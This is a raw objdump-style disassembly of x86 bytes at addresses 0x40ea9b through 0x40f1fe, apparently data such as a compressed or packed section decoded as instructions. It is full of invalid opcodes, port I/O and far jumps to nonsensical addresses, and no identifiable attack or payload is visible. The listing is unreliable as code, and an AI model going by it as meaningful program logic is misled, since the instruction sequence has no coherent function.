  40ea9b:	sbb    edi,DWORD PTR [eax-0x68]
  40ea9e:	sub    al,0x4f
  40eaa0:	pop    esp
  40eaa1:	sbb    BYTE PTR [edi-0x91158d9],0xfd
  40eaa8:	mov    ch,0xf
  40eaaa:	loope  0x40eab8
  40eaac:	jne    0x40ea7d
  40eaae:	jg     0x40ea9d
  40eab0:	inc    BYTE PTR [edx+edi*8+0x6503f8b6]
  40eab7:	mov    esp,0x7c067e1f
  40eabc:	aam    0x6
  40eabe:	mov    BYTE PTR [edx+eiz*1-0x1d],cl
  40eac2:	pinsrw mm5,WORD PTR [esi],0xfb
  40eac6:	add    eax,0x6f13ab7b
  40eacb:	xor    al,0x73
  40eacd:	xchg   BYTE PTR [ebp-0x9],dh
  40ead0:	cmp    DWORD PTR [eax],eax
  40ead2:	mov    esi,0xb1aaee79
  40ead7:	cld    
  40ead8:	push   esp
  40ead9:	clc    
  40eada:	shl    BYTE PTR [ebp-0x77],1
  40eadd:	xor    BYTE PTR [ebx-0x34],bl
  40eae0:	add    al,0x90
  40eae2:	push   ebx
  40eae3:	out    0x22,eax
  40eae5:	fcom   QWORD PTR [esi+0x7d]
  40eae8:	daa    
  40eae9:	ror    DWORD PTR [eax+0x19],cl
  40eaec:	jge    0x40ea8f
  40eaee:	enter  0x2835,0x38
  40eaf2:	scas   al,BYTE PTR es:[edi]
  40eaf3:	push   ecx
  40eaf4:	add    al,0xae
  40eaf6:	in     eax,dx
  40eaf7:	sub    dl,BYTE PTR [ecx]
  40eaf9:	stc    
  40eafa:	aas    
  40eafb:	push   ss
  40eafc:	jg     0x40eaca
  40eafe:	sbb    al,0x3a
  40eb00:	mov    dl,0xbe
  40eb02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb03:	rcr    al,cl
  40eb05:	fwait
  40eb06:	sub    edx,esi
  40eb08:	sbb    DWORD PTR [ecx],ebp
  40eb0a:	mov    al,0x14
  40eb0c:	out    dx,al
  40eb0d:	mov    ecx,0xc40cf876
  40eb12:	jp     0x40eb68
  40eb14:	inc    edx
  40eb15:	inc    ebx
  40eb16:	pop    ebx
  40eb17:	sbb    DWORD PTR fs:[ebx],ebp
  40eb1a:	mov    dh,0x61
  40eb1c:	(bad)  
  40eb1d:	xchg   ecx,eax
  40eb1e:	inc    eax
  40eb1f:	jno    0x40eae4
  40eb21:	xchg   DWORD PTR [edi],esi
  40eb23:	jbe    0x40eb0d
  40eb25:	ins    DWORD PTR es:[edi],dx
  40eb26:	dec    esp
  40eb27:	xor    esp,edx
  40eb29:	jp     0x40eb65
  40eb2b:	out    dx,eax
  40eb2c:	add    DWORD PTR [ebx],ebp
  40eb2e:	xchg   esi,eax
  40eb2f:	push   edi
  40eb30:	or     DWORD PTR [edx],ecx
  40eb32:	xchg   ecx,eax
  40eb33:	mov    ah,0xea
  40eb35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb36:	inc    esi
  40eb37:	cmp    eax,0x4df1fb2c
  40eb3c:	fcomp  QWORD PTR [esi-0x1e]
  40eb3f:	les    esi,FWORD PTR [eax-0x408e10d6]
  40eb45:	aam    0xb4
  40eb47:	(bad)  
  40eb48:	js     0x40eb26
  40eb4a:	mov    dl,0x79
  40eb4c:	xchg   esi,eax
  40eb4d:	xlat   BYTE PTR ds:[ebx]
  40eb4e:	je     0x40eb25
  40eb50:	jo     0x40eb61
  40eb52:	dec    esi
  40eb53:	pop    eax
  40eb54:	(bad)  
  40eb55:	jmp    0xd78ae1fb
  40eb5a:	jl     0x40eb3e
  40eb5c:	enter  0x653a,0xd5
  40eb60:	sbb    al,0x28
  40eb62:	jae    0x40eafc
  40eb64:	leave  
  40eb65:	aaa    
  40eb66:	mov    ecx,0xc09711a6
  40eb6b:	mov    cs,WORD PTR [eax+ecx*4-0x64b3dc69]
  40eb72:	fmul   QWORD PTR [esi+0x6ffc45cd]
  40eb78:	ror    ebx,1
  40eb7a:	fsubr  DWORD PTR [ebx-0x6]
  40eb7d:	cmp    esi,DWORD PTR [edx]
  40eb7f:	sbb    ah,0x4f
  40eb82:	and    edi,DWORD PTR [ecx-0x51]
  40eb85:	clc    
  40eb86:	test   BYTE PTR [edi],al
  40eb88:	dec    eax
  40eb89:	xchg   esp,eax
  40eb8a:	sbb    ebx,DWORD PTR [ebx]
  40eb8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb8d:	push   ebp
  40eb8e:	push   0xffffffca
  40eb90:	push   ebp
  40eb91:	sbb    al,0xe2
  40eb93:	sub    ecx,DWORD PTR [edx+ebp*8+0x75]
  40eb97:	pop    ebp
  40eb98:	cwde   
  40eb99:	daa    
  40eb9a:	fdivr  QWORD PTR [ebp+0x4e711298]
  40eba0:	mov    bl,0x35
  40eba2:	ficom  DWORD PTR [ebx+ecx*2-0x39]
  40eba6:	lods   al,BYTE PTR ds:[esi]
  40eba7:	cmc    
  40eba8:	gs daa 
  40ebaa:	jmp    FWORD PTR es:[ecx]
  40ebad:	aam    0x74
  40ebaf:	es dec ebp
  40ebb1:	and    BYTE PTR [esi+0x8f55f7b],ah
  40ebb7:	pop    ds
  40ebb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebb9:	cmp    dl,BYTE PTR [ecx-0x63488d7b]
  40ebbf:	test   BYTE PTR [ecx+eiz*4+0x61],ah
  40ebc3:	mov    ebx,0x2119397e
  40ebc8:	in     eax,0x3d
  40ebca:	or     BYTE PTR [edx-0x2d157e67],0x8e
  40ebd1:	adc    eax,0x25022c26
  40ebd6:	and    edi,ebp
  40ebd8:	in     eax,0x4b
  40ebda:	inc    ebp
  40ebdb:	xchg   ebx,eax
  40ebdc:	sbb    al,0xd1
  40ebde:	mov    ch,0xd3
  40ebe0:	sar    BYTE PTR [edi-0x248f9647],1
  40ebe6:	out    dx,eax
  40ebe7:	mov    ds:0x3a737301,al
  40ebec:	push   0x49b4be8e
  40ebf1:	mov    ecx,0xe8709f32
  40ebf6:	int3   
  40ebf7:	stos   BYTE PTR es:[edi],al
  40ebf8:	retf   
  40ebf9:	sub    al,0x62
  40ebfb:	adc    eax,0x53c63921
  40ec00:	mul    BYTE PTR [ecx]
  40ec02:	lock xor ch,BYTE PTR [eax]
  40ec05:	xchg   esi,eax
  40ec06:	sar    BYTE PTR [edx+0x1ca38cf6],1
  40ec0c:	ss lahf 
  40ec0e:	push   esp
  40ec0f:	push   es
  40ec10:	push   0x5633f421
  40ec15:	ss imul edi,ecx,0x6d
  40ec19:	test   ebp,ebx
  40ec1b:	xor    al,BYTE PTR [ebp+esi*2+0x3f0e5bfe]
  40ec22:	xchg   ecx,eax
  40ec23:	scas   eax,DWORD PTR es:[edi]
  40ec24:	sub    eax,0x5f425fae
  40ec29:	call   0xd7c789c8
  40ec2e:	icebp  
  40ec2f:	sub    DWORD PTR [edi+0x63],esp
  40ec32:	sub    esi,DWORD PTR [edx+edi*2+0x1fce8449]
  40ec39:	jmp    0xa4eb872b
  40ec3e:	sub    ch,al
  40ec40:	ret    0xb089
  40ec43:	popa   
  40ec44:	adc    DWORD PTR [edi],edx
  40ec46:	xor    ebx,DWORD PTR [ebx]
  40ec48:	fsqrt  
  40ec4a:	or     bl,BYTE PTR [ebx+0x1b]
  40ec4d:	add    ecx,esp
  40ec4f:	(bad)  
  40ec50:	hlt    
  40ec51:	stos   BYTE PTR es:[edi],al
  40ec52:	pop    ds
  40ec53:	jge    0x40ec67
  40ec55:	inc    edi
  40ec56:	lahf   
  40ec57:	dec    ebx
  40ec58:	pusha  
  40ec59:	jmp    0x8a3d2561
  40ec5e:	xor    cl,ah
  40ec60:	and    esp,esp
  40ec62:	adc    DWORD PTR [edx+0x57],esi
  40ec65:	sbb    bl,BYTE PTR [ecx-0x5d]
  40ec68:	test   eax,0x50c2830c
  40ec6d:	in     eax,dx
  40ec6e:	les    edi,FWORD PTR [edx+0x6c]
  40ec71:	jge    0x40ec9f
  40ec73:	popf   
  40ec74:	lods   al,BYTE PTR ds:[esi]
  40ec75:	pop    ebx
  40ec76:	xchg   edi,eax
  40ec77:	mov    BYTE PTR [edx],dh
  40ec79:	jl     0x40ec74
  40ec7b:	jmp    0x3fed:0x7da12472
  40ec82:	and    ecx,edx
  40ec84:	xchg   edx,eax
  40ec85:	mov    edi,0x99f31710
  40ec8a:	mov    cl,0x35
  40ec8c:	add    DWORD PTR [eax],edx
  40ec8e:	lock in al,0xf3
  40ec91:	sbb    eax,0xfc58782f
  40ec96:	dec    esp
  40ec97:	xchg   edi,eax
  40ec98:	(bad)  
  40ec99:	into   
  40ec9a:	retf   
  40ec9b:	mov    al,0x49
  40ec9d:	out    0xed,eax
  40ec9f:	imul   esp,DWORD PTR [edx-0x19],0x20
  40eca3:	push   eax
  40eca4:	jns    0x40ecd2
  40eca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eca7:	cmp    DWORD PTR ds:0x8aa94aa9,esp
  40ecad:	adc    DWORD PTR [eax+0x46b43671],eax
  40ecb3:	shr    DWORD PTR [ecx-0x64],1
  40ecb6:	scas   eax,DWORD PTR es:[edi]
  40ecb7:	loop   0x40ecb9
  40ecb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecba:	or     ebp,DWORD PTR [ebp-0x652eca5d]
  40ecc0:	mov    al,ds:0x743d40bb
  40ecc5:	cmp    bh,bh
  40ecc7:	xchg   ebx,eax
  40ecc8:	sahf   
  40ecc9:	data16 add al,0x70
  40eccc:	leave  
  40eccd:	arpl   WORD PTR [ecx+ebp*8-0x7aa23143],di
  40ecd4:	mov    edx,DWORD PTR [esi-0x3bb36156]
  40ecda:	sahf   
  40ecdb:	(bad)  
  40ecdc:	ret    
  40ecdd:	sbb    esi,DWORD PTR [edi]
  40ecdf:	jne    0x40ed09
  40ece1:	ja     0x40ed0e
  40ece3:	adc    DWORD PTR [eax-0x3ce7a781],ebp
  40ece9:	add    dh,BYTE PTR [ebx+0x243224e3]
  40ecef:	push   cs
  40ecf0:	rcl    bl,1
  40ecf2:	int3   
  40ecf3:	sbb    al,BYTE PTR [ecx+0x48]
  40ecf6:	test   eax,0x34e28cde
  40ecfb:	sbb    dl,ah
  40ecfd:	cs sub al,0xd2
  40ed01:	cli    
  40ed02:	or     eax,ebp
  40ed04:	into   
  40ed05:	pop    ds
  40ed06:	rol    BYTE PTR [ebp+0x5b],0xe4
  40ed0a:	jbe    0x40ed0b
  40ed0c:	mov    ebx,0x48b8947e
  40ed11:	xlat   BYTE PTR ds:[ebx]
  40ed12:	(bad)  
  40ed13:	out    0x15,eax
  40ed15:	inc    edi
  40ed16:	fdivr  DWORD PTR [edx-0x21]
  40ed19:	sbb    esp,eax
  40ed1b:	inc    esi
  40ed1c:	outs   dx,BYTE PTR ds:[esi]
  40ed1d:	pop    edi
  40ed1e:	inc    ebx
  40ed1f:	mov    esp,0xf0799dae
  40ed24:	xchg   esp,eax
  40ed25:	and    dl,0x74
  40ed28:	inc    edi
  40ed29:	fsubp  st(3),st
  40ed2b:	xor    dl,ch
  40ed2d:	shr    edi,cl
  40ed2f:	and    edi,DWORD PTR [ecx-0x48]
  40ed32:	lods   al,BYTE PTR ds:[esi]
  40ed33:	mov    ebp,0x9ea140b5
  40ed38:	mov    dl,BYTE PTR [ecx+0xe16954b]
  40ed3e:	pop    ds
  40ed3f:	clc    
  40ed40:	pop    edx
  40ed41:	shr    DWORD PTR [ebx+0x677c34f1],1
  40ed47:	pop    edx
  40ed48:	stc    
  40ed49:	inc    edx
  40ed4a:	mov    eax,ecx
  40ed4c:	add    ebp,DWORD PTR [edi+0x78]
  40ed4f:	cli    
  40ed50:	or     eax,0xfa685a24
  40ed55:	add    BYTE PTR [edx+0xb],al
  40ed58:	sbb    ebp,edi
  40ed5a:	xchg   ebx,eax
  40ed5b:	inc    ebp
  40ed5c:	sbb    bh,0x1a
  40ed5f:	rcl    DWORD PTR [ecx+ebx*1+0x32e244a0],1
  40ed66:	sbb    edx,DWORD PTR [ebp-0x47]
  40ed69:	and    al,0x75
  40ed6b:	mov    bl,0x99
  40ed6d:	(bad)  
  40ed6e:	ja     0x40ed72
  40ed70:	jecxz  0x40ed1d
  40ed72:	jg     0x40ed2a
  40ed74:	clc    
  40ed75:	pusha  
  40ed76:	mov    al,0x2a
  40ed78:	out    0x3,al
  40ed7a:	imul   edi,DWORD PTR [edx+0x3],0x1f
  40ed7e:	fidiv  DWORD PTR [ecx-0x5979a18a]
  40ed84:	add    bl,BYTE PTR [ebp-0x73]
  40ed87:	sub    esi,DWORD PTR [esi]
  40ed89:	mov    ebp,0xc0eeb7fa
  40ed8e:	cs push cs
  40ed90:	shld   DWORD PTR [ecx+eiz*2],eax,cl
  40ed94:	jne    0x40ede0
  40ed96:	jge    0x40ed6a
  40ed98:	cdq    
  40ed99:	pop    ebx
  40ed9a:	xchg   BYTE PTR [edi+0x30c25de3],dh
  40eda0:	mov    es,WORD PTR [edx+0x4]
  40eda3:	mov    bh,BYTE PTR [esi+0x75]
  40eda6:	les    ebp,FWORD PTR [eax+ebx*1+0x51]
  40edaa:	imul   eax,DWORD PTR [eax+0x12],0xc26f8c9a
  40edb1:	gs out dx,al
  40edb3:	xchg   BYTE PTR [ecx+edx*1-0x7b],bh
  40edb7:	ds stos DWORD PTR es:[edi],eax
  40edb9:	cmp    dl,ch
  40edbb:	and    BYTE PTR [ebp-0x15fc7743],dl
  40edc1:	xor    BYTE PTR [edx+ecx*4-0x7],al
  40edc5:	push   ds
  40edc6:	xor    bh,BYTE PTR [eax]
  40edc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edc9:	outs   dx,DWORD PTR ds:[esi]
  40edca:	and    al,0x85
  40edcc:	out    dx,al
  40edcd:	out    dx,al
  40edce:	add    al,0x26
  40edd0:	out    dx,eax
  40edd1:	pusha  
  40edd2:	mov    BYTE PTR [ecx-0x5e429947],bh
  40edd8:	aas    
  40edd9:	inc    edi
  40edda:	adc    bl,bh
  40eddc:	add    bl,cl
  40edde:	in     eax,0x5f
  40ede0:	(bad)  
  40ede1:	stc    
  40ede2:	push   0x78530abe
  40ede7:	jp     0x40edc4
  40ede9:	sbb    ebp,DWORD PTR [eax-0x7d]
  40edec:	sbb    BYTE PTR [edx+0x51be4395],cl
  40edf2:	push   ds
  40edf3:	cmp    bh,BYTE PTR [ecx+0x24832c4b]
  40edf9:	pop    es
  40edfa:	pop    es
  40edfb:	sbb    ax,0xb6c2
  40edff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee00:	outs   dx,DWORD PTR ds:[esi]
  40ee01:	sub    esi,DWORD PTR [ebx]
  40ee03:	xchg   ebx,eax
  40ee04:	and    edi,DWORD PTR [ebp+0x27]
  40ee07:	xchg   bh,ch
  40ee09:	mov    cs,WORD PTR [ebx-0x5b6fe872]
  40ee0f:	shr    DWORD PTR [ebx],cl
  40ee11:	stos   DWORD PTR es:[edi],eax
  40ee12:	repz add al,0x92
  40ee15:	xor    DWORD PTR [edx-0x588650da],edi
  40ee1b:	(bad)  
  40ee1c:	addr16 cmp bl,dl
  40ee1f:	or     al,0x5f
  40ee21:	(bad)  
  40ee23:	and    al,0xca
  40ee25:	fstp   TBYTE PTR [edi+0x59e09d76]
  40ee2b:	jmp    DWORD PTR ds:0xb51cd83
  40ee31:	or     DWORD PTR [ebx+0x350380ec],edx
  40ee37:	and    edx,DWORD PTR [ebp-0x41d56820]
  40ee3d:	push   ebp
  40ee3e:	fist   DWORD PTR ds:[ebx+eax*8+0x563e80c6]
  40ee46:	mov    BYTE PTR [ebp-0x6],0x72
  40ee4a:	adc    BYTE PTR [ecx-0x7f],0x4f
  40ee4e:	pushf  
  40ee4f:	hlt    
  40ee50:	mov    esi,0x3375edb2
  40ee55:	mov    ecx,gs
  40ee57:	mov    edi,0x4fd619a3
  40ee5c:	arpl   cx,dx
  40ee5e:	push   ss
  40ee5f:	(bad)  
  40ee60:	jmp    DWORD PTR [eax+0x49]
  40ee63:	outs   dx,DWORD PTR ds:[esi]
  40ee64:	or     DWORD PTR [edi+edi*2-0x25960f0d],ebp
  40ee6b:	jnp    0x40eee5
  40ee6d:	sbb    bl,BYTE PTR [ebx+edx*8]
  40ee70:	sub    DWORD PTR [eax+0x7cdc1c4d],edx
  40ee76:	fcom   DWORD PTR [ebp-0x52bd95f6]
  40ee7c:	std    
  40ee7d:	pop    ebp
  40ee7e:	push   es
  40ee7f:	mov    edx,0x5860f1f3
  40ee84:	adc    DWORD PTR [ebx+0x3143bc5f],0x78
  40ee8b:	push   edx
  40ee8c:	xor    eax,0x91445d1c
  40ee91:	ret    
  40ee92:	push   ss
  40ee93:	iret   
  40ee94:	aad    0x83
  40ee96:	or     eax,0x4bcf973
  40ee9b:	pop    ebx
  40ee9c:	xchg   DWORD PTR cs:[eax-0x18],esp
  40eea0:	loope  0x40ee6a
  40eea2:	and    eax,0xa3dd97a3
  40eea7:	retf   0x3109
  40eeaa:	xchg   cx,ax
  40eeac:	push   ds
  40eead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeae:	add    al,0xac
  40eeb0:	mov    ds:0xdc2e78ed,eax
  40eeb5:	out    dx,al
  40eeb6:	shr    DWORD PTR [esi+0x60],cl
  40eeb9:	xor    eax,0x31612dae
  40eebe:	dec    edx
  40eebf:	mov    esi,0x2b80292e
  40eec4:	jnp    0x40ef35
  40eec6:	(bad)  
  40eec7:	out    dx,al
  40eec8:	jp     0x40ef0e
  40eeca:	popf   
  40eecb:	mov    edx,0xdea840ca
  40eed0:	or     eax,0x32951c76
  40eed5:	scas   eax,DWORD PTR es:[edi]
  40eed6:	test   eax,0x15b06ced
  40eedb:	(bad)  
  40eedc:	in     eax,0xdb
  40eede:	xchg   DWORD PTR ds:0x6b696a5c,esi
  40eee4:	sub    DWORD PTR [esi+esi*4-0x6f90cb93],esi
  40eeeb:	fst    DWORD PTR cs:[ebx+0x6b676313]
  40eef2:	jecxz  0x40ef3a
  40eef4:	and    DWORD PTR ds:0x10fb2104,0xc007991
  40eefe:	or     esp,DWORD PTR [edx-0x76b7e373]
  40ef04:	scas   eax,DWORD PTR es:[edi]
  40ef05:	scas   al,BYTE PTR es:[edi]
  40ef06:	test   BYTE PTR [edx-0x3396818a],ch
  40ef0c:	popf   
  40ef0d:	jg     0x40ef01
  40ef0f:	fdivrp st(0),st
  40ef11:	mov    ah,0x21
  40ef13:	(bad)  
  40ef14:	bound  esi,QWORD PTR [ecx]
  40ef16:	inc    edx
  40ef17:	stos   BYTE PTR es:[edi],al
  40ef18:	xchg   ebx,eax
  40ef19:	mov    ds:0x4c2394b8,al
  40ef1e:	pop    ss
  40ef1f:	jp     0x40eec2
  40ef21:	jmp    0xdb5c3503
  40ef26:	mov    cs:0xd693bd7d,eax
  40ef2c:	mov    al,0x83
  40ef2e:	push   eax
  40ef2f:	jbe    0x40eed9
  40ef31:	add    ah,BYTE PTR [ebp-0x27]
  40ef34:	out    dx,al
  40ef35:	(bad)  
  40ef36:	xchg   esi,eax
  40ef37:	cmp    eax,DWORD PTR [ecx+0x2f]
  40ef3a:	sub    BYTE PTR [ecx],bh
  40ef3c:	cmp    ch,BYTE PTR ds:0x3403bf61
  40ef42:	ficom  WORD PTR [esi+0x47]
  40ef45:	xchg   edx,eax
  40ef46:	sub    edx,eax
  40ef48:	xor    eax,DWORD PTR [ebx+0x27]
  40ef4b:	add    eax,0x1cb75e4b
  40ef50:	mov    eax,0x7c680386
  40ef55:	sti    
  40ef56:	iret   
  40ef57:	push   cs
  40ef58:	test   al,0x4
  40ef5a:	fnsave [ebx-0x776c30e7]
  40ef60:	cld    
  40ef61:	lock inc eax
  40ef63:	lds    eax,FWORD PTR [edx]
  40ef65:	sub    eax,0xc26da23
  40ef6a:	sub    DWORD PTR [edi],ebp
  40ef6c:	dec    esp
  40ef6d:	push   0xfb158261
  40ef72:	shl    dh,cl
  40ef74:	or     edi,DWORD PTR [edx+0x74444f1c]
  40ef7a:	clc    
  40ef7b:	mov    al,0xd3
  40ef7d:	cdq    
  40ef7e:	out    0xd0,eax
  40ef80:	rol    DWORD PTR [ebx],cl
  40ef82:	repnz mov cl,bh
  40ef85:	ds out dx,eax
  40ef87:	sbb    eax,0xf55ff1
  40ef8c:	sbb    ebx,DWORD PTR [ecx]
  40ef8e:	in     al,0xd
  40ef90:	hlt    
  40ef91:	repz lahf 
  40ef93:	stc    
  40ef94:	ins    DWORD PTR es:[edi],dx
  40ef95:	aas    
  40ef96:	jmp    0x9281d19e
  40ef9b:	into   
  40ef9c:	mov    ah,0x2a
  40ef9e:	out    dx,al
  40ef9f:	mov    DWORD PTR [ebp-0x46],edi
  40efa2:	mov    ds:0x654f4b8d,eax
  40efa7:	mov    ss,esp
  40efa9:	in     al,0x39
  40efab:	cmp    DWORD PTR [ebp-0x5edd83df],0x28
  40efb2:	ja     0x40ef8c
  40efb4:	ja     0x40f028
  40efb6:	mov    edx,0xb64ba081
  40efbb:	inc    eax
  40efbc:	jg     0x40f018
  40efbe:	xor    al,0x78
  40efc0:	push   es
  40efc1:	push   ebx
  40efc2:	sub    al,0xec
  40efc4:	push   eax
  40efc5:	mov    dl,BYTE PTR [ebp+0x4f7426eb]
  40efcb:	push   edx
  40efcc:	outs   dx,BYTE PTR ds:[esi]
  40efcd:	mov    esi,cs
  40efcf:	jnp    0x40eff0
  40efd1:	test   DWORD PTR [ebp+0x40082873],ebp
  40efd7:	xchg   edi,esi
  40efd9:	mov    ds:0xc9e4cf25,eax
  40efde:	pop    eax
  40efdf:	fwait
  40efe0:	lahf   
  40efe1:	jbe    0x40efc6
  40efe3:	xor    cl,bl
  40efe5:	(bad)  
  40efe6:	sbb    BYTE PTR [edi+0x6c3b6168],bl
  40efec:	and    DWORD PTR ds:0x2d09c0d8,ebx
  40eff2:	fadd   QWORD PTR es:[ebp+eax*4+0x62739de9]
  40effa:	jle    0x40f06c
  40effc:	or     eax,0xcd4d3ed9
  40f001:	or     al,0x7f
  40f003:	daa    
  40f004:	fs stos BYTE PTR es:[edi],al
  40f006:	out    dx,al
  40f007:	adc    al,0x1a
  40f009:	scas   al,BYTE PTR es:[edi]
  40f00a:	xchg   esp,eax
  40f00b:	inc    eax
  40f00c:	lea    ebx,[ecx-0x7bc816fb]
  40f012:	sub    eax,0xfd0ed74b
  40f017:	push   es
  40f018:	call   0xafe:0x19f126fa
  40f01f:	mov    esi,0xf5d45bf6
  40f024:	enter  0x92fd,0x60
  40f028:	inc    edi
  40f029:	xor    al,0x4d
  40f02b:	or     DWORD PTR [edi-0x2e446a30],ebp
  40f031:	fsubr  DWORD PTR [esi-0x3]
  40f034:	jmp    FWORD PTR [ebx+0x7ca54954]
  40f03a:	scas   eax,DWORD PTR es:[edi]
  40f03b:	jmp    0x2c145f47
  40f040:	ins    BYTE PTR es:[edi],dx
  40f041:	xchg   DWORD PTR [esi],esi
  40f043:	mov    cl,0x41
  40f045:	leave  
  40f046:	(bad)  
  40f047:	scas   al,BYTE PTR es:[edi]
  40f048:	cmp    DWORD PTR [eax+0x129b6fb4],ecx
  40f04e:	popa   
  40f04f:	pop    eax
  40f050:	hlt    
  40f051:	and    al,0xba
  40f053:	sub    BYTE PTR [edx],al
  40f055:	dec    esp
  40f056:	and    DWORD PTR [ebx],0x5f80a93a
  40f05c:	dec    ebp
  40f05d:	int3   
  40f05e:	mov    WORD PTR [esp+ebp*2],gs
  40f061:	in     eax,dx
  40f062:	imul   edx,DWORD PTR ds:0x28a0379f,0xafeafdf4
  40f06c:	or     BYTE PTR [edi-0x634227c0],ah
  40f072:	cmp    ebp,eax
  40f074:	and    esp,eax
  40f076:	stos   DWORD PTR es:[edi],eax
  40f077:	and    eax,0x359ca37b
  40f07c:	(bad)  
  40f07d:	dec    ebx
  40f07e:	scas   al,BYTE PTR es:[edi]
  40f07f:	test   eax,0xaa12bb4c
  40f084:	lea    esp,[ecx-0x3c]
  40f087:	loope  0x40f081
  40f089:	cmp    DWORD PTR [ecx-0x52ae1f90],esi
  40f08f:	sub    eax,0xdd9cf619
  40f094:	xor    DWORD PTR [ecx+0x62a71a83],0x2a
  40f09b:	not    BYTE PTR [edi]
  40f09d:	xchg   edi,eax
  40f09e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f09f:	jg     0x40f024
  40f0a1:	xor    al,0x1
  40f0a3:	imul   ebx,ecx,0xa5e7d8bb
  40f0a9:	inc    edi
  40f0aa:	xchg   edx,eax
  40f0ab:	inc    ebx
  40f0ac:	dec    ebx
  40f0ad:	daa    
  40f0ae:	and    edx,edi
  40f0b0:	jg     0x40f0a7
  40f0b2:	popa   
  40f0b3:	(bad)
  40f0b6:	mov    WORD PTR [esi+0x6e4025e9],?
  40f0bc:	jb     0x40f05b
  40f0be:	or     DWORD PTR [esi],0x1f
  40f0c1:	mov    al,0x87
  40f0c3:	sub    al,0x3f
  40f0c5:	mov    edi,0x29b0f22
  40f0ca:	int3   
  40f0cb:	cmp    dl,ch
  40f0cd:	sbb    BYTE PTR [edi+0x18],0xd4
  40f0d1:	add    BYTE PTR [bx+di],dl
  40f0d4:	xchg   ebx,eax
  40f0d5:	add    BYTE PTR [ecx],0x5b
  40f0d8:	xor    DWORD PTR [ecx+ecx*8],esi
  40f0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0dc:	mov    ds:0x2c8e25ca,eax
  40f0e1:	xor    eax,0xdd0f98e2
  40f0e6:	mov    ebx,0x2d15598d
  40f0eb:	inc    esp
  40f0ec:	pop    ds
  40f0ed:	cmp    bl,cl
  40f0ef:	fild   WORD PTR [esi-0x22e0df16]
  40f0f5:	mov    WORD PTR ds:0x66a91760,gs
  40f0fb:	jo     0x40f169
  40f0fd:	and    al,0x46
  40f0ff:	add    al,0xcb
  40f101:	add    cx,cx
  40f104:	add    BYTE PTR [ebp+0x26],al
  40f107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f108:	fstp   DWORD PTR [ecx-0x15]
  40f10b:	mov    edi,0xb5789022
  40f110:	xchg   esp,eax
  40f111:	jbe    0x40f11d
  40f113:	enter  0x7dc2,0x29
  40f117:	ficom  DWORD PTR [eax+0x3e3775a2]
  40f11d:	lea    ecx,[edi+0x68e0c95a]
  40f123:	and    edi,DWORD PTR [edi-0x4c]
  40f126:	cmc    
  40f127:	into   
  40f128:	test   BYTE PTR [edx+0x37],dl
  40f12b:	fnstcw WORD PTR [edi+edx*4-0xd5f559d]
  40f132:	mov    cl,0x96
  40f134:	inc    eax
  40f135:	pop    ebp
  40f136:	add    al,0xb1
  40f138:	add    eax,0x1a080626
  40f13d:	addr16 jns 0x40f0ea
  40f140:	cmp    eax,0x3a1a4e3d
  40f145:	mov    ch,0xec
  40f147:	pusha  
  40f148:	add    al,0x69
  40f14a:	data16 out dx,al
  40f14c:	sub    edi,esi
  40f14e:	adc    al,cl
  40f150:	ins    DWORD PTR es:[edi],dx
  40f151:	jns    0x40f189
  40f153:	xor    ebx,ebx
  40f155:	not    DWORD PTR [ebx-0x319e981f]
  40f15b:	pushf  
  40f15c:	ret    
  40f15d:	rcl    DWORD PTR [esi],cl
  40f15f:	call   0xac37:0x7662cd9a
  40f166:	aam    0x2
  40f168:	lods   eax,DWORD PTR ds:[esi]
  40f169:	test   al,0x29
  40f16b:	mov    ah,0xf7
  40f16d:	jmp    0xc1fbca85
  40f172:	xor    ch,BYTE PTR [ecx]
  40f174:	adc    eax,0x3bdf5ef5
  40f179:	inc    esi
  40f17a:	xchg   ebp,eax
  40f17b:	jle    0x40f13e
  40f17d:	pop    edx
  40f17e:	fisttp DWORD PTR [esi+0x32]
  40f181:	adc    DWORD PTR [edi-0x4aff3e81],edx
  40f187:	xchg   ebx,eax
  40f188:	into   
  40f189:	inc    ebx
  40f18a:	arpl   WORD PTR [edi+0x7d],di
  40f18d:	rol    BYTE PTR [edi+0x65f38b4f],cl
  40f193:	or     DWORD PTR [edi+ecx*4],edx
  40f196:	push   ds
  40f197:	outs   dx,DWORD PTR ds:[esi]
  40f198:	jecxz  0x40f178
  40f19a:	adc    eax,DWORD PTR [ebp+0x67]
  40f19d:	inc    ebp
  40f19e:	stos   BYTE PTR es:[edi],al
  40f19f:	push   ds
  40f1a0:	cmc    
  40f1a1:	mov    ecx,0x28101a78
  40f1a6:	ja     0x40f227
  40f1a8:	lds    esp,FWORD PTR [eax+0xc05bbf2]
  40f1ae:	xor    ecx,0x50c434f1
  40f1b4:	stc    
  40f1b5:	jb     0x40f1b9
  40f1b7:	mov    bh,0x8c
  40f1b9:	inc    ecx
  40f1ba:	cmp    BYTE PTR [eax+0x47999fd7],dl
  40f1c0:	push   ebp
  40f1c1:	jbe    0x40f15f
  40f1c3:	mov    ah,ch
  40f1c5:	mov    esp,0x676ec913
  40f1ca:	pop    ebp
  40f1cb:	sub    dl,BYTE PTR ss:[ebx+0x66823e2]
  40f1d2:	sub    eax,0x44200098
  40f1d7:	pusha  
  40f1d8:	loop   0x40f1ae
  40f1da:	add    BYTE PTR [edx],0x4f
  40f1dd:	adc    esi,DWORD PTR [ebx+0x5b]
  40f1e0:	adc    ecx,DWORD PTR [ebp+0x19]
  40f1e3:	mov    eax,0x5b6418bc
  40f1e8:	mov    al,ds:0x909c345c
  40f1ed:	sahf   
  40f1ee:	pop    esp
  40f1ef:	pop    ecx
  40f1f0:	nop
  40f1f1:	xor    al,0xef
  40f1f3:	jae    0x40f1e7
  40f1f5:	cmp    esi,DWORD PTR [esi]
  40f1f7:	mov    BYTE PTR [ecx],ah
  40f1f9:	jnp    0x40f18d
  40f1fb:	cmp    ch,ah
  40f1fd:	inc    ebp
  40f1fe:	ds push ds
